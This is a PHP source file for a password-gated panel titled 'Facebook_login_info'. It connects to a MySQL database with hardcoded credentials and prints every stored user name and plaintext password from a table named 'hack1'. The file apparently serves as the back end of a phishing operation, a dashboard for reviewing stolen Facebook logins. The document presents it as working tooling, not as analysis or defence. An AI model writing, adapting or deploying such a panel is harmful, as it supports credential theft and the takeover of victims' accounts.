<?php 
session_start();
if(isset($_POST['submit'])){
	if(md5($_POST['user'])=="b1d77711e71034d92c3496aef640986f" and md5($_POST['pass'])=="1a1dc91c907325c69271ddf0c944bc72"){
         
         $_SESSION['user']=$_POST['user'];
         $_SESSION['pass']=$_POST['pass'];
         header("location: ?");
	}else{
		header("location: ?");
	   }


}


/* log section */
if (isset($_GET['action']) AND $_GET['action'] == 'logout') {
	session_destroy();
	header("Location: ?");
	die();
}





?>
<html>
<head>
	<title>Facebook_login_info</title>
	<link rel="stylesheet" href="css/login.css">
	 <meta name="viewport" content="width=device-width, initial-scale=1">
	 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>

<!-- login part -->
   <?php   if(!isset($_SESSION['user'],$_SESSION['pass'])) { ?>
      <div class="heading">
          <h1>Tamilan infoTech</h1>
      </div>
   
     <form action="" method="post" class="form_style">
      <h2>Log_in</h2>
      <div>
          <input type="text" name="user" placeholder="user name" autocomplete="off" /><br />
          <input type="password" name="pass" placeholder="password" autocomplete="off" /><br />
          <input type="submit" value="login" name="submit" /><br />
       </div>
      </form>
   <?php die(); } ?>
<!--main part -->
<header>
<div class="heading">
	<h1>Tamilan_infoTech<h1>
	</div>
</header>
<nav>
    <ul>
    	<li><a href="?action=logout"><i class="fa fa-sign-out"></i> logout</a></li>
    </ul>
</nav>
<section>
<?php
      /*data base*/
$conn=mysqli_connect("localhost","id2056314_tamilan","crazytricky","id2056314_tamilan_infotech") or die("connection failed");
$sql = "SELECT id, user, password FROM hack1";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
  ?>
  <table>
          <tr>
             <td class="id">ID</td>
             <td class="user">USER</td>
             <td class="user">PASSWORD</td>
          </tr>
  <?php
     $i=1;
    while($row = mysqli_fetch_assoc($result)) {
         echo"
          <tr>
        	    <td class='id'>".$i++."</td>
        	    <td class='user'>".$row['user']."</td>
        	    <td class='user'>".$row["password"]."</td>
        	</tr>";
  }?>

</table>

  <?php
} else {
    echo "0 results";
}

mysqli_close($conn);
?>
<section>
</body>
</html>